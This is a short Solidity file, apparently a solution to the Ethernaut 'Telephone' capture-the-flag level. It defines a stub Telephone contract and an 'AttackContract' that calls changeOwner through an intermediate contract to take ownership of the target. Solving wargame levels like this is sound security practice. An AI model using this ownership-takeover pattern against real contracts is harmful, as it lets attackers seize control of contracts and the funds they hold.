// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    
  address owner;

    function changeOwner(address _owner) public {}
    
}

contract AttackContract {
    
    Telephone t;
    
    constructor (address _telephoneAddress) {
        t = Telephone(_telephoneAddress);
    }
 
    function changeOwner(address _newOwner) public  {
        t.changeOwner(_newOwner);
    }
}